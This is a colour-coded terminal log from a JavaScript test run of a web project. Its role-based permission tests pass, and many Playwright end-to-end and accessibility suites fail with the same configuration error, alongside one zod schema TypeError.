  [32m'moderator'[39m,
  [32m'admin'[39m
]

[90mstdout[2m | src/lib/auth/permissions.test.ts[2m > [22m[2mRBAC/ABAC Security[2m > [22m[2mPrivilege Escalation Prevention[2m > [22m[2muser ne peut pas s'auto-promouvoir
[22m[39m[RBAC] configured roles: [
  [32m'citizen'[39m,
  [32m'owner'[39m,
  [32m'author'[39m,
  [32m'mediator'[39m,
  [32m'educator'[39m,
  [32m'moderator'[39m,
  [32m'admin'[39m
]

[90mstdout[2m | src/lib/auth/permissions.test.ts[2m > [22m[2mRBAC/ABAC Security[2m > [22m[2mPrivilege Escalation Prevention[2m > [22m[2mowner ne peut pas supprimer owner
[22m[39m[RBAC] configured roles: [
  [32m'citizen'[39m,
  [32m'owner'[39m,
  [32m'author'[39m,
  [32m'mediator'[39m,
  [32m'educator'[39m,
  [32m'moderator'[39m,
  [32m'admin'[39m
]

[90mstdout[2m | src/lib/auth/permissions.test.ts[2m > [22m[2mRBAC/ABAC Security[2m > [22m[2mEdge Cases[2m > [22m[2mr├┤le inexistant = deny
[22m[39m[RBAC] configured roles: [
  [32m'citizen'[39m,
  [32m'owner'[39m,
  [32m'author'[39m,
  [32m'mediator'[39m,
  [32m'educator'[39m,
  [32m'moderator'[39m,
  [32m'admin'[39m
]

[90mstdout[2m | src/lib/auth/permissions.test.ts[2m > [22m[2mRBAC/ABAC Security[2m > [22m[2mEdge Cases[2m > [22m[2mpermission inexistante = deny
[22m[39m[RBAC] configured roles: [
  [32m'citizen'[39m,
  [32m'owner'[39m,
  [32m'author'[39m,
  [32m'mediator'[39m,
  [32m'educator'[39m,
  [32m'moderator'[39m,
  [32m'admin'[39m
]

[90mstdout[2m | src/lib/auth/permissions.test.ts[2m > [22m[2mRBAC/ABAC Security[2m > [22m[2mEdge Cases[2m > [22m[2mcontext manquant pour ABAC = deny
[22m[39m[RBAC] configured roles: [
  [32m'citizen'[39m,
  [32m'owner'[39m,
  [32m'author'[39m,
  [32m'mediator'[39m,
  [32m'educator'[39m,
  [32m'moderator'[39m,
  [32m'admin'[39m
]

[90mstdout[2m | src/lib/auth/permissions.test.ts
[22m[39m
Ô£à Test suite complete


 [32mÔ£ô[39m src/lib/auth/permissions.test.ts [2m([22m[2m26 tests[22m[2m)[22m[32m 245[2mms[22m[39m

[31mÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»[39m[1m[41m Failed Suites 
20 [49m[22m[31mÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»[39m

[41m[1m FAIL [22m[49m 
tests/a11y/a11y-performance.test.ts[2m [ 
tests/a11y/a11y-performance.test.ts ][22m
[31m[1mError[22m: Playwright Test did not expect 
test.describe() to be called here.
Most common reasons include:
- You are calling test.describe() in a configuration 
file.
- You are calling test.describe() in a file that is 
imported by the configuration file.
- You have two different versions of 
@playwright/test. This usually happens
  when one of the dependencies in your package.json 
depends on @playwright/test.[39m
[90m [2mÔØ»[22m TestTypeImpl._currentSuite node_mod
ules/.pnpm/playwright@1.58.2/node_modules/playwright/l
ib/common/testType.js:[2m75:13[22m[39m
[90m [2mÔØ»[22m TestTypeImpl._describe node_modules
/.pnpm/playwright@1.58.2/node_modules/playwright/lib/c
ommon/testType.js:[2m115:24[22m[39m
[90m [2mÔØ»[22m Function.describe node_modules/.pnp
m/playwright@1.58.2/node_modules/playwright/lib/transf
orm/transform.js:[2m282:12[22m[39m
[36m [2mÔØ»[22m 
tests/a11y/a11y-performance.test.ts:[2m5:6[22m[39m
    [90m  3| [39m
    [90m  4| [39m[90m// Accessibility tests[39m
    [90m  5| [39mtest[33m.[39m[34mdescribe[39m(
[32m'Accessibilit├®'[39m[33m,[39m () [33m=>[39m {
    [90m   | [39m     [31m^[39m
    [90m  6| [39m  test('Axe-core: aucune violation 
critique sur toutes les pages', asyÔÇª
    [90m  7| [39m    [35mconst[39m urls 
[33m=[39m [[32m'/'[39m[33m,[39m 
[32m'/fr/'[39m[33m,[39m 
[32m'/en/'[39m[33m,[39m 
[32m'/ar/'[39m[33m,[39m 
[32m'/es/'[39m][33m;[39m

[31m[2mÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»
ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»[1/38]ÔÄ»[22m[39m

[41m[1m FAIL [22m[49m 
tests/e2e/critical-flows.test.ts[2m [ 
tests/e2e/critical-flows.test.ts ][22m
[31m[1mError[22m: Playwright Test did not expect 
test.describe() to be called here.
Most common reasons include:
- You are calling test.describe() in a configuration 
file.
- You are calling test.describe() in a file that is 
imported by the configuration file.
- You have two different versions of 
@playwright/test. This usually happens
  when one of the dependencies in your package.json 
depends on @playwright/test.[39m
[90m [2mÔØ»[22m TestTypeImpl._currentSuite node_mod
ules/.pnpm/playwright@1.58.2/node_modules/playwright/l
ib/common/testType.js:[2m75:13[22m[39m
[90m [2mÔØ»[22m TestTypeImpl._describe node_modules
/.pnpm/playwright@1.58.2/node_modules/playwright/lib/c
ommon/testType.js:[2m115:24[22m[39m
[90m [2mÔØ»[22m Function.describe node_modules/.pnp
m/playwright@1.58.2/node_modules/playwright/lib/transf
orm/transform.js:[2m282:12[22m[39m
[36m [2mÔØ»[22m 
tests/e2e/critical-flows.test.ts:[2m6:6[22m[39m
    [90m  4| [39m[35mconst[39m variants 
[33m=[39m [[32m'initial'[39m[33m,[39m 
[32m'retro'[39m[33m,[39m 
[32m'modern'[39m[33m,[39m 
[32m'futuristic'[39m][33m;[39m
    [90m  5| [39m
    [90m  6| 
[39mtest[33m.[39m[34mdescribe[39m([32m'Parcours 
critique - Connexion'[39m[33m,[39m () [33m=>[39m 
{
    [90m   | [39m     [31m^[39m
    [90m  7| [39m  
locales[33m.[39m[34mforEach[39m(locale 
[33m=>[39m {
    [90m  8| [39m    [34mtest[39m([32m`Connexion 
locale=[39m[36m${[39mlocale[36m}[39m[32m`[39m[
33m,[39m [35masync[39m ({ page }) [33m=>[39m {

[31m[2mÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»
ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»[2/38]ÔÄ»[22m[39m

[41m[1m FAIL [22m[49m 
tests/integration/comments.test.ts[2m [ 
tests/integration/comments.test.ts ][22m
[31m[1mTypeError[22m: 
__vite_ssr_import_1__.z.string(...).nullish is not a 
function[39m
[36m [2mÔØ»[22m 
src/actions/comments.ts:[2m15:32[22m[39m
    [90m 13| [39m            parentId[33m:[39m z[
33m.[39m[34mstring[39m()[33m.[39m[34moptional[3
9m()[33m,[39m
    [90m 14| [39m            content[33m:[39m z[3
3m.[39m[34mstring[39m()[33m.[39m[34mmin[39m([3
4m3[39m)[33m,[39m
    [90m 15| [39m            rating: 
z.string().nullish().transform(v => v ? parseInt(vÔÇª
    [90m   | [39m                               
[31m^[39m
    [90m 16| [39m        })[33m,[39m
    [90m 17| [39m        handler[33m:[39m 
[35masync[39m (input[33m,[39m context) 
[33m=>[39m {
[90m [2mÔØ»[22m 
tests/integration/comments.test.ts:[2m44:1[22m[39m

[31m[2mÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»
ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»[3/38]ÔÄ»[22m[39m

[41m[1m FAIL [22m[49m 
tests/e2e/ui/alert.test.ts[2m [ 
tests/e2e/ui/alert.test.ts ][22m
[31m[1mError[22m: Playwright Test did not expect 
test.describe() to be called here.
Most common reasons include:
- You are calling test.describe() in a configuration 
file.
- You are calling test.describe() in a file that is 
imported by the configuration file.
- You have two different versions of 
@playwright/test. This usually happens
  when one of the dependencies in your package.json 
depends on @playwright/test.[39m
[90m [2mÔØ»[22m TestTypeImpl._currentSuite node_mod
ules/.pnpm/playwright@1.58.2/node_modules/playwright/l
ib/common/testType.js:[2m75:13[22m[39m
[90m [2mÔØ»[22m TestTypeImpl._describe node_modules
/.pnpm/playwright@1.58.2/node_modules/playwright/lib/c
ommon/testType.js:[2m115:24[22m[39m
[90m [2mÔØ»[22m Function.describe node_modules/.pnp
m/playwright@1.58.2/node_modules/playwright/lib/transf
orm/transform.js:[2m282:12[22m[39m
[36m [2mÔØ»[22m 
tests/e2e/ui/alert.test.ts:[2m6:6[22m[39m
    [90m  4| [39m[90m// examples that appear on 
/fr/docs/design/alert.[39m
    [90m  5| [39m
    [90m  6| [39mtest.describe('AlertComponent ÔÇô 
Page de documentation compl├¿te', () =>ÔÇª
    [90m   | [39m     [31m^[39m
    [90m  7| [39m  [35mconst[39m url [33m=[39m 
[32m'http://localhost:4321/fr/docs/design/alert'[39m
[33m;[39m
    [90m  8| [39m

[31m[2mÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»
ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»[4/38]ÔÄ»[22m[39m

[41m[1m FAIL [22m[49m 
tests/e2e/ui/badge.test.ts[2m [ 
tests/e2e/ui/badge.test.ts ][22m
[31m[1mError[22m: Playwright Test did not expect 
test.describe() to be called here.
Most common reasons include:
- You are calling test.describe() in a configuration 
file.
- You are calling test.describe() in a file that is 
imported by the configuration file.
- You have two different versions of 
@playwright/test. This usually happens
  when one of the dependencies in your package.json 
depends on @playwright/test.[39m
[90m [2mÔØ»[22m TestTypeImpl._currentSuite node_mod
ules/.pnpm/playwright@1.58.2/node_modules/playwright/l
ib/common/testType.js:[2m75:13[22m[39m
[90m [2mÔØ»[22m TestTypeImpl._describe node_modules
/.pnpm/playwright@1.58.2/node_modules/playwright/lib/c
ommon/testType.js:[2m115:24[22m[39m
[90m [2mÔØ»[22m Function.describe node_modules/.pnp
m/playwright@1.58.2/node_modules/playwright/lib/transf
orm/transform.js:[2m282:12[22m[39m
[36m [2mÔØ»[22m 
tests/e2e/ui/badge.test.ts:[2m6:6[22m[39m
    [90m  4| [39m[90m// both desktop and mobile 
renderings are handled identically.[39m
    [90m  5| [39m
    [90m  6| [39mtest.describe('BadgeComponent ÔÇô 
Page de documentation compl├¿te', () =>ÔÇª
    [90m   | [39m     [31m^[39m
    [90m  7| [39m  [35mconst[39m url [33m=[39m 
[32m'http://localhost:4321/fr/docs/design/badge'[39m
[33m;[39m
    [90m  8| [39m

[31m[2mÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»
ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»[5/38]ÔÄ»[22m[39m

[41m[1m FAIL [22m[49m 
tests/e2e/ui/button.test.ts[2m [ 
tests/e2e/ui/button.test.ts ][22m
[31m[1mError[22m: Playwright Test did not expect 
test.describe() to be called here.
Most common reasons include:
- You are calling test.describe() in a configuration 
file.
- You are calling test.describe() in a file that is 
imported by the configuration file.
- You have two different versions of 
@playwright/test. This usually happens
  when one of the dependencies in your package.json 
depends on @playwright/test.[39m
[90m [2mÔØ»[22m TestTypeImpl._currentSuite node_mod
ules/.pnpm/playwright@1.58.2/node_modules/playwright/l
ib/common/testType.js:[2m75:13[22m[39m
[90m [2mÔØ»[22m TestTypeImpl._describe node_modules
/.pnpm/playwright@1.58.2/node_modules/playwright/lib/c
ommon/testType.js:[2m115:24[22m[39m
[90m [2mÔØ»[22m Function.describe node_modules/.pnp
m/playwright@1.58.2/node_modules/playwright/lib/transf
orm/transform.js:[2m282:12[22m[39m
[36m [2mÔØ»[22m 
tests/e2e/ui/button.test.ts:[2m7:6[22m[39m
    [90m  5| [39m// documentation page at 
/fr/docs/design/button (adapt the URL if needÔÇª
    [90m  6| [39m
    [90m  7| [39mtest.describe('ButtonComponent ÔÇô 
Page de documentation compl├¿te', () =ÔÇª
    [90m   | [39m     [31m^[39m
    [90m  8| [39m  [35mconst[39m url [33m=[39m 
[32m'http://localhost:4321/fr/docs/design/button'[39m
[33m;[39m
    [90m  9| [39m

[31m[2mÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»
ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»[6/38]ÔÄ»[22m[39m

[41m[1m FAIL [22m[49m 
tests/e2e/ui/card.test.ts[2m [ 
tests/e2e/ui/card.test.ts ][22m
[31m[1mError[22m: Playwright Test did not expect 
test.describe() to be called here.
Most common reasons include:
- You are calling test.describe() in a configuration 
file.
- You are calling test.describe() in a file that is 
imported by the configuration file.
- You have two different versions of 
@playwright/test. This usually happens
  when one of the dependencies in your package.json 
depends on @playwright/test.[39m
[90m [2mÔØ»[22m TestTypeImpl._currentSuite node_mod
ules/.pnpm/playwright@1.58.2/node_modules/playwright/l
ib/common/testType.js:[2m75:13[22m[39m
[90m [2mÔØ»[22m TestTypeImpl._describe node_modules
/.pnpm/playwright@1.58.2/node_modules/playwright/lib/c
ommon/testType.js:[2m115:24[22m[39m
[90m [2mÔØ»[22m Function.describe node_modules/.pnp
m/playwright@1.58.2/node_modules/playwright/lib/transf
orm/transform.js:[2m282:12[22m[39m
[36m [2mÔØ»[22m 
tests/e2e/ui/card.test.ts:[2m3:6[22m[39m
    [90m  1| [39m[35mimport[39m { test[33m,[39m 
expect } [35mfrom[39m 
[32m'@playwright/test'[39m[33m;[39m
    [90m  2| [39m
    [90m  3| [39mtest.describe('CardComponent ÔÇô 
documentation page (couverture totale)'ÔÇª
    [90m   | [39m     [31m^[39m
    [90m  4| [39m  [35mconst[39m url [33m=[39m 
[32m'http://localhost:4321/fr/docs/design/card'[39m[
33m;[39m
    [90m  5| [39m

[31m[2mÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»
ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»[7/38]ÔÄ»[22m[39m

[41m[1m FAIL [22m[49m 
tests/e2e/ui/code.test.ts[2m [ 
tests/e2e/ui/code.test.ts ][22m
[31m[1mError[22m: Playwright Test did not expect 
test.describe() to be called here.
Most common reasons include:
- You are calling test.describe() in a configuration 
file.
- You are calling test.describe() in a file that is 
imported by the configuration file.
- You have two different versions of 
@playwright/test. This usually happens
  when one of the dependencies in your package.json 
depends on @playwright/test.[39m
[90m [2mÔØ»[22m TestTypeImpl._currentSuite node_mod
ules/.pnpm/playwright@1.58.2/node_modules/playwright/l
ib/common/testType.js:[2m75:13[22m[39m
[90m [2mÔØ»[22m TestTypeImpl._describe node_modules
/.pnpm/playwright@1.58.2/node_modules/playwright/lib/c
ommon/testType.js:[2m115:24[22m[39m
[90m [2mÔØ»[22m Function.describe node_modules/.pnp
m/playwright@1.58.2/node_modules/playwright/lib/transf
orm/transform.js:[2m282:12[22m[39m
[36m [2mÔØ»[22m 
tests/e2e/ui/code.test.ts:[2m6:6[22m[39m
    [90m  4| [39m// presence of JavaScript snippet 
to ensure the page rendered the examÔÇª
    [90m  5| [39m
    [90m  6| [39mtest[33m.[39m[34mdescribe[39m(
[32m'CodeComponent ÔÇô documentation 
page'[39m[33m,[39m () [33m=>[39m {
    [90m   | [39m     [31m^[39m
    [90m  7| [39m  
test[33m.[39m[34mbeforeEach[39m(({ isMobile }) 
[33m=>[39m {
    [90m  8| [39m    
test[33m.[39m[34mskip[39m(isMobile[33m,[39m 
[32m'skip mobile, not needed'[39m)[33m;[39m

[31m[2mÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»
ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»[8/38]ÔÄ»[22m[39m

[41m[1m FAIL [22m[49m 
tests/e2e/ui/dialog.test.ts[2m [ 
tests/e2e/ui/dialog.test.ts ][22m
[31m[1mError[22m: Playwright Test did not expect 
test.describe() to be called here.
Most common reasons include:
- You are calling test.describe() in a configuration 
file.
- You are calling test.describe() in a file that is 
imported by the configuration file.
- You have two different versions of 
@playwright/test. This usually happens
  when one of the dependencies in your package.json 
depends on @playwright/test.[39m
[90m [2mÔØ»[22m TestTypeImpl._currentSuite node_mod
ules/.pnpm/playwright@1.58.2/node_modules/playwright/l
ib/common/testType.js:[2m75:13[22m[39m
[90m [2mÔØ»[22m TestTypeImpl._describe node_modules
/.pnpm/playwright@1.58.2/node_modules/playwright/lib/c
ommon/testType.js:[2m115:24[22m[39m
[90m [2mÔØ»[22m Function.describe node_modules/.pnp
m/playwright@1.58.2/node_modules/playwright/lib/transf
orm/transform.js:[2m282:12[22m[39m
[36m [2mÔØ»[22m 
tests/e2e/ui/dialog.test.ts:[2m3:6[22m[39m
    [90m  1| [39m[35mimport[39m { test[33m,[39m 
expect } [35mfrom[39m 
[32m'@playwright/test'[39m[33m;[39m
    [90m  2| [39m
    [90m  3| [39mtest.describe('DialogComponent ÔÇô 
documentation page (couverture totaleÔÇª
    [90m   | [39m     [31m^[39m
    [90m  4| [39m  [35mconst[39m url [33m=[39m 
[32m'http://localhost:4321/fr/docs/design/dialog'[39m
[33m;[39m
    [90m  5| [39m

[31m[2mÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»
ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»[9/38]ÔÄ»[22m[39m

[41m[1m FAIL [22m[49m 
tests/e2e/ui/dropdown.test.ts[2m [ 
tests/e2e/ui/dropdown.test.ts ][22m
[31m[1mError[22m: Playwright Test did not expect 
test.describe() to be called here.
Most common reasons include:
- You are calling test.describe() in a configuration 
file.
- You are calling test.describe() in a file that is 
imported by the configuration file.
- You have two different versions of 
@playwright/test. This usually happens
  when one of the dependencies in your package.json 
depends on @playwright/test.[39m
[90m [2mÔØ»[22m TestTypeImpl._currentSuite node_mod
ules/.pnpm/playwright@1.58.2/node_modules/playwright/l
ib/common/testType.js:[2m75:13[22m[39m
[90m [2mÔØ»[22m TestTypeImpl._describe node_modules
/.pnpm/playwright@1.58.2/node_modules/playwright/lib/c
ommon/testType.js:[2m115:24[22m[39m
[90m [2mÔØ»[22m Function.describe node_modules/.pnp
m/playwright@1.58.2/node_modules/playwright/lib/transf
orm/transform.js:[2m282:12[22m[39m
[36m [2mÔØ»[22m 
tests/e2e/ui/dropdown.test.ts:[2m3:6[22m[39m
    [90m  1| [39m[35mimport[39m { test[33m,[39m 
expect } [35mfrom[39m 
[32m'@playwright/test'[39m[33m;[39m
    [90m  2| [39m
    [90m  3| [39mtest.describe('DropdownComponent 
ÔÇô documentation page (couverture totaÔÇª
    [90m   | [39m     [31m^[39m
    [90m  4| [39m  [35mconst[39m url [33m=[39m 
[32m'http://localhost:4321/fr/docs/design/dropdown'[3
9m[33m;[39m
    [90m  5| [39m

[31m[2mÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»
ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»[10/38]ÔÄ»[22m[39m

[41m[1m FAIL [22m[49m 
tests/e2e/ui/form.test.ts[2m [ 
tests/e2e/ui/form.test.ts ][22m
[31m[1mError[22m: Playwright Test did not expect 
test.describe() to be called here.
Most common reasons include:
- You are calling test.describe() in a configuration 
file.
- You are calling test.describe() in a file that is 
imported by the configuration file.
- You have two different versions of 
@playwright/test. This usually happens
  when one of the dependencies in your package.json 
depends on @playwright/test.[39m
[90m [2mÔØ»[22m TestTypeImpl._currentSuite node_mod
ules/.pnpm/playwright@1.58.2/node_modules/playwright/l
ib/common/testType.js:[2m75:13[22m[39m
[90m [2mÔØ»[22m TestTypeImpl._describe node_modules
/.pnpm/playwright@1.58.2/node_modules/playwright/lib/c
ommon/testType.js:[2m115:24[22m[39m
[90m [2mÔØ»[22m Function.describe node_modules/.pnp
m/playwright@1.58.2/node_modules/playwright/lib/transf
orm/transform.js:[2m282:12[22m[39m
[36m [2mÔØ»[22m 
tests/e2e/ui/form.test.ts:[2m3:6[22m[39m
    [90m  1| [39m[35mimport[39m { test[33m,[39m 
expect } [35mfrom[39m 
[32m'@playwright/test'[39m[33m;[39m
    [90m  2| [39m
    [90m  3| [39mtest.describe('FormComponents ÔÇô 
documentation page (couverture totale)ÔÇª
    [90m   | [39m     [31m^[39m
    [90m  4| [39m  [35mconst[39m url [33m=[39m 
[32m'http://localhost:4321/fr/docs/design/form'[39m[
33m;[39m
    [90m  5| [39m

[31m[2mÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»
ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»[11/38]ÔÄ»[22m[39m

[41m[1m FAIL [22m[49m 
tests/e2e/ui/kbd.test.ts[2m [ 
tests/e2e/ui/kbd.test.ts ][22m
[31m[1mError[22m: Playwright Test did not expect 
test.describe() to be called here.
Most common reasons include:
- You are calling test.describe() in a configuration 
file.
- You are calling test.describe() in a file that is 
imported by the configuration file.
- You have two different versions of 
@playwright/test. This usually happens
  when one of the dependencies in your package.json 
depends on @playwright/test.[39m
[90m [2mÔØ»[22m TestTypeImpl._currentSuite node_mod
ules/.pnpm/playwright@1.58.2/node_modules/playwright/l
ib/common/testType.js:[2m75:13[22m[39m
[90m [2mÔØ»[22m TestTypeImpl._describe node_modules
/.pnpm/playwright@1.58.2/node_modules/playwright/lib/c
ommon/testType.js:[2m115:24[22m[39m
[90m [2mÔØ»[22m Function.describe node_modules/.pnp
m/playwright@1.58.2/node_modules/playwright/lib/transf
orm/transform.js:[2m282:12[22m[39m
[36m [2mÔØ»[22m 
tests/e2e/ui/kbd.test.ts:[2m3:6[22m[39m
    [90m  1| [39m[35mimport[39m { test[33m,[39m 
expect } [35mfrom[39m 
[32m'@playwright/test'[39m[33m;[39m
    [90m  2| [39m
    [90m  3| [39mtest.describe('KbdComponent ÔÇô 
documentation page (couverture totale)',ÔÇª
    [90m   | [39m     [31m^[39m
    [90m  4| [39m  [35mconst[39m url [33m=[39m 
[32m'http://localhost:4321/fr/docs/design/kbd'[39m[3
3m;[39m
    [90m  5| [39m

[31m[2mÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»
ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»[12/38]ÔÄ»[22m[39m

[41m[1m FAIL [22m[49m 
tests/e2e/ui/link.test.ts[2m [ 
tests/e2e/ui/link.test.ts ][22m
[31m[1mError[22m: Playwright Test did not expect 
test.describe() to be called here.
Most common reasons include:
- You are calling test.describe() in a configuration 
file.
- You are calling test.describe() in a file that is 
imported by the configuration file.
- You have two different versions of 
@playwright/test. This usually happens
  when one of the dependencies in your package.json 
depends on @playwright/test.[39m
[90m [2mÔØ»[22m TestTypeImpl._currentSuite node_mod
ules/.pnpm/playwright@1.58.2/node_modules/playwright/l
ib/common/testType.js:[2m75:13[22m[39m
[90m [2mÔØ»[22m TestTypeImpl._describe node_modules
/.pnpm/playwright@1.58.2/node_modules/playwright/lib/c
ommon/testType.js:[2m115:24[22m[39m
[90m [2mÔØ»[22m Function.describe node_modules/.pnp
m/playwright@1.58.2/node_modules/playwright/lib/transf
orm/transform.js:[2m282:12[22m[39m
[36m [2mÔØ»[22m 
tests/e2e/ui/link.test.ts:[2m6:6[22m[39m
    [90m  4| [39m// Focus on unique text and 
attributes to avoid picking up unrelated cÔÇª
    [90m  5| [39m
    [90m  6| [39mtest[33m.[39m[34mdescribe[39m(
[32m'LinkComponent ÔÇô documentation 
page'[39m[33m,[39m () [33m=>[39m {
    [90m   | [39m     [31m^[39m
    [90m  7| [39m  [35mconst[39m url [33m=[39m 
[32m'http://localhost:4321/fr/docs/design/link'[39m[
33m;[39m
    [90m  8| [39m

[31m[2mÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»
ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»[13/38]ÔÄ»[22m[39m

[41m[1m FAIL [22m[49m 
tests/e2e/ui/menudropdown.test.ts[2m [ 
tests/e2e/ui/menudropdown.test.ts ][22m
[31m[1mError[22m: Playwright Test did not expect 
test.describe() to be called here.
Most common reasons include:
- You are calling test.describe() in a configuration 
file.
- You are calling test.describe() in a file that is 
imported by the configuration file.
- You have two different versions of 
@playwright/test. This usually happens
  when one of the dependencies in your package.json 
depends on @playwright/test.[39m
[90m [2mÔØ»[22m TestTypeImpl._currentSuite node_mod
ules/.pnpm/playwright@1.58.2/node_modules/playwright/l
ib/common/testType.js:[2m75:13[22m[39m
[90m [2mÔØ»[22m TestTypeImpl._describe node_modules
/.pnpm/playwright@1.58.2/node_modules/playwright/lib/c
ommon/testType.js:[2m115:24[22m[39m
[90m [2mÔØ»[22m Function.describe node_modules/.pnp
m/playwright@1.58.2/node_modules/playwright/lib/transf
orm/transform.js:[2m282:12[22m[39m
[36m [2mÔØ»[22m 
tests/e2e/ui/menudropdown.test.ts:[2m6:6[22m[39m
    [90m  4| [39m[90m// header and at least one 
menu item text.[39m
    [90m  5| [39m
    [90m  6| [39mtest[33m.[39m[34mdescribe[39m(
[32m'MenuDropdown ÔÇô documentation 
page'[39m[33m,[39m () [33m=>[39m {
    [90m   | [39m     [31m^[39m
    [90m  7| [39m  
test[33m.[39m[34mbeforeEach[39m(({ isMobile }) 
[33m=>[39m {
    [90m  8| [39m    
test[33m.[39m[34mskip[39m(isMobile[33m,[39m 
[32m'mobile behaviour not needed'[39m)[33m;[39m

[31m[2mÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»
ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»[14/38]ÔÄ»[22m[39m

[41m[1m FAIL [22m[49m 
tests/e2e/ui/sheet.test.ts[2m [ 
tests/e2e/ui/sheet.test.ts ][22m
[31m[1mError[22m: Playwright Test did not expect 
test.describe() to be called here.
Most common reasons include:
- You are calling test.describe() in a configuration 
file.
- You are calling test.describe() in a file that is 
imported by the configuration file.
- You have two different versions of 
@playwright/test. This usually happens
  when one of the dependencies in your package.json 
depends on @playwright/test.[39m
[90m [2mÔØ»[22m TestTypeImpl._currentSuite node_mod
ules/.pnpm/playwright@1.58.2/node_modules/playwright/l
ib/common/testType.js:[2m75:13[22m[39m
[90m [2mÔØ»[22m TestTypeImpl._describe node_modules
/.pnpm/playwright@1.58.2/node_modules/playwright/lib/c
ommon/testType.js:[2m115:24[22m[39m
[90m [2mÔØ»[22m Function.describe node_modules/.pnp
m/playwright@1.58.2/node_modules/playwright/lib/transf
orm/transform.js:[2m282:12[22m[39m
[36m [2mÔØ»[22m 
tests/e2e/ui/sheet.test.ts:[2m5:6[22m[39m
    [90m  3| [39m[90m// Sheet page has a trigger 
button; assert its existence.[39m
    [90m  4| [39m
    [90m  5| [39mtest[33m.[39m[34mdescribe[39m(
[32m'SheetComponent ÔÇô documentation 
page'[39m[33m,[39m () [33m=>[39m {
    [90m   | [39m     [31m^[39m
    [90m  6| [39m  
test[33m.[39m[34mbeforeEach[39m(({ isMobile }) 
[33m=>[39m {
    [90m  7| [39m    
test[33m.[39m[34mskip[39m(isMobile[33m,[39m 
[32m'sheet interactions may differ'[39m)[33m;[39m

[31m[2mÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»
ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»ÔÄ»[15/38]ÔÄ»[22m[39m

[41m[1m FAIL [22m[49m 
tests/e2e/ui/switch.test.ts[2m [ 
tests/e2e/ui/switch.test.ts ][22m
[31m[1mError[22m: Playwright Test did not expect 
test.describe() to be called here.
Most common reasons include:
- You are calling test.describe() in a configuration 
file.
- You are calling test.describe() in a file that is 
imported by the configuration file.
- You have two different versions of 
@playwright/test. This usually happens
